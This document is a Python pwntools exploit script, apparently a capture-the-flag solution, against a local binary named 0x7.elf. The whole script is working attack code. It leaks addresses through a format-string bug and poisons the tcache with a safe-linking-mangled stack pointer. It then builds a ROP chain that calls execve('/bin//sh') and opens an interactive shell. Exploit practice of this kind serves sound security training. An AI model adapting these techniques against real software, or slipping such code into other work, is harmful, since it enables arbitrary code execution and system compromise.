from pwn import *

context.update(arch="amd64", os="linux")
elf = context.binary = ELF("./0x7.elf")
p = process("./0x7.elf")


def find(gadget):
    found = rop.find_gadget(gadget)

    if found == None:
        error(f"Gadget not found: {gadget}")

    return p64(found.address)


def protect(addr, ptr):
    return (addr >> 12) ^ ptr


def edit(i, data):
    p.sendline(b"1")
    p.sendline(b"%d" % i)
    p.sendline(data)


def read(i):
    p.sendline(b"2")
    p.sendline(b"%d" % i)

    p.recvuntil(b"--")
    p.recvline()

    data = p.recvline()
    data = data[:-1]

    p.recvline()
    return data


def delete(i):
    p.sendline(b"3")
    p.sendline(b"%d" % i)


edit(1, b"%5$p,%6$p,%8$p")
edit(2, b"empty")

leaks = read(1).split(b",")
addr_leak = int(leaks[0], 16)
heap_leak = int(leaks[1], 16)
stack_leak = int(leaks[2], 16)

elf.address = addr_leak - 0xCD520
stack_ptr = protect(heap_leak, stack_leak)

info("Got base address: 0x%x" % elf.address)
info("Got stack address: 0x%x" % stack_leak)
info("Got note 1 heap address: 0x%x" % heap_leak)

delete(2)  # tcache: 2
delete(1)  # tcache: 1 -> 2
edit(1, p64(stack_ptr))  # tcache: 1 -> stack_leak

rop = ROP(elf)

payload = p64(0)  # padding

payload += find(["pop rdx", "pop rbx", "ret"])  # pop rdx; pop rbx; ret;
payload += p64(0)  # rdx
payload += p64(0)  # rbx

payload += find(["pop rsi", "ret"])  # pop rsi; ret;
payload += p64(0)  # rsi

payload += find(["pop rdi", "ret"])  # pop rdi; ret;
payload += p64(elf.bss())  # rdi
payload += p64(elf.address + 0x41B06)  # pop rcx; tzcnt eax, eax; ret;
payload += b"/bin//sh"  # rcx
payload += p64(elf.address + 0x41466)  # mov qword ptr [rdi], rcx; ret;

payload += find(["pop rdi", "ret"])  # pop rdi; ret;
payload += p64(elf.bss())  # rdi

payload += find(["pop rax", "ret"])  # pop rax; ret;
payload += p64(59)  # rax

payload += find(["syscall"])

edit(3, b"empty")  # tcache: stack_leak
edit(4, payload)

p.sendline(b"4")  # quit

p.interactive()
p.close()
